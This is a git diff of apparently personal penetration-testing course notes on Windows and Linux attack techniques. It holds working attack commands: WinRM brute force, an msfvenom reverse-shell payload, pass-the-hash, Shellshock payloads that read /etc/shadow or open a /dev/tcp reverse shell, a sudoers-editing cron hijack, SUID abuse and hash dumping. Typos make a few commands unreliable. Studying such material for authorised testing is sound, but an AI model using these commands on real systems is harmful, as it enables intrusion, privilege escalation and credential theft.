@@ -1,8 +1,8 @@
 # Table of Contents
 1. Overview
-2. Tools
-	1. Windows
-	2. Linux
+3. [Windows_Attacks](#Windows_attacks)
+4. [Linux_Attacks](#Linux_Attacks)
+
 
 ---
 # Overview
@@ -20,8 +20,7 @@ Type of Vulnerabilities
 - Denial of Service
 
 ---
-# Tools
-## Windows Attacks
+# Windows_Attacks
 ### Services
 
 | Service  | #Ports   | Description                            |
@@ -37,28 +36,11 @@ Type of Vulnerabilities
 - [IIS WebDav](../../Services/IIS-WebDav.md)
 - [SMB with PsExec](../../Services/SMB.md#PsExec)
 - [RDP](../../Services/RDP.md)
-- WinRM
-#### Windows Remote Management (WinRM)
-- 5985/5986 ports
-##### crackmapexec
-- brute force
-- `crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
-- `crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"`
-
-##### evil-winrm.rb
-- ruby script which gets shell access
-- `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.5`
-
-##### msfconsonle
-- use exploit/windows/winrm/winrm_script_exec
-	- set rhosts addr
-	- set force_vbs true
-	- set username administrator
-	- set password tinkerbell
+- [WinRM](../../Services/WinRM.md)
 
 ---
 ### Privilege escalation
-#### github Tools
+#### GitHub Tools
 Iffy don't seem to be updated recently
 - Windows-Exploit-Suggester
 	- target patch level compared to MS vulnerability database
@@ -94,7 +76,12 @@ Iffy don't seem to be updated recently
 	- `upload /root/Desktop/tools/UACME/Akagi64.exe`
 	- `shell` 
 		- `.\Akagi64.exe 23 C:\Temp\shells.exe` 
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4455 -f exe > shells.exe` generate payload
+- generate payload
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 \
+LPORT=4455 -f exe > shells.exe
+``` 
+
 - msfconsole
 	- use multi/handler
 	- set payload windows/meterpreter/reverse_tcp
@@ -184,6 +171,8 @@ Using mimikats
 	4. `lsadump::secrets` 
 	5. `sekurlsa::logonpasswords`  might show some cleartext
 
+---
+
 #### Pass-The-Hash
 Metasploit PsExec module
 1. get meterpreter access
@@ -198,13 +187,15 @@ Metasploit PsExec module
 	4. setpass HASH
 	5. set target Native\ upload
 
-crackmapexec
+---
+
+#### crackmapexec
 `crackmapexec smb 10.2.34.3 -u Administrator -H "lm:ntlm" -x "ipconfig"`
 use hash to run a command
 
 
 ---
-## Linux Attacks
+# Linux_Attacks
 
 ### Services
 
@@ -214,5 +205,91 @@ use hash to run a command
 | SSH     | 22     | Secure Shell           |
 | FTP     | 21     | File Transfer Protocol |
 | SAMBA   | 445    | SMB implementation     |
+### #FTP
+- Login brute force 
+- [FTP hydra](../../Services/FTP.md#hydra)
+### #SSH
+- login brute force
+- [SSH](../../Services/SSH.md#hydra)
+### #SAMBA 
+- [SMB](../../Services/SMB.md)
 
 ---
+
+## Vulnerabilities
+### Shellshock
+CVE-2014-6271
+#### Apache via CGI script injection
+- --script : check if vulnerable
+	- http-shellshock --script-args http-shellshock.uri=/gettime.cgi
+- burpsuite
+	- useful with foxyproxy in firefox
+	- send to repeater and replace user agent with the following
+	- `() { :; }; echo; echo; /bin/bash -c ' cat /etc/shaddow'`
+	- `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.168.23.3/1234 0>&1'`
+- netcat : set up listener
+	- `nc -nvlp 1234`
+##### msfconsole
+- search shellshock
+	- auxiliary says if vuln
+	- exploit to take advantage
+- use exploit/multi/http/apache_mod_cgi_bash_env_exec
+	- set rhosts targetIP
+	- set targeturi /gettime.cgi
+
+---
+
+## Privilege escalation
+### Kernel Exploits
+GitHub mzet/linux-exploit-suggester
+1. get meterpreter session on host
+2. upload Desktop/les.sh /temp/les.sh
+3. ./les.sh
+4. script lists important information and possible exploits
+5. download exploit from ExploitDB
+	1. upload to target then compile c code with gcc
+	2. run code
+
+### Cron Jobs
+**LAB example**
+This scenario message file exists in student user folder. Can use the following to search through files in the /usr dir to find the same path.
+- -r : recursive
+- -n : line number
+- -w : match only whole word
+```bash
+grep -rnw /usr -e "home/student/message"
+```
+overwrite script found being called by cron
+```bash
+printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+```
+`sudo -l` : check sudoers permissions
+`/etc/init.d/cron reload` : force cron to reload and run
+can use echo instead of printf
+
+### SUID
+**LAB Example**
+Two binaries exist in home folder. one calls the other binary with SUID set for root. You can delete the called binary and replace it with bash and have it called. Can check this is being called by using strings on the welcome binary.
+`rm greetings`
+`cp /bin/bash greetings`
+./welcome
+
+### Dumping Hashes
+
+| Value | Hashing Algorith |
+| ----- | ---------------- |
+| $1    | MD5              |
+| $2    | Blowfish         |
+| $5    | SHA-256          |
+| $6    | SHA-512          |
+**LAB Example**
+1. Use msfconsole to exploit proftpd with the 133c backdoor. 
+2. Get a cmd shell session by default then run /bin/bash -i to upgrade to rot bash. 
+3. `ctrl-z` to send to background then `sessions`
+4. `sessions -u 1` to try upgrading session to meterpreter
+5. `sessions` to view that it was created
+6. `sessions 2` swap to the new meterpreter session
+7. hashdump module `search hashdump` "post/linux/gather/hashdump"
+	1. set session 2
+	2. run
+
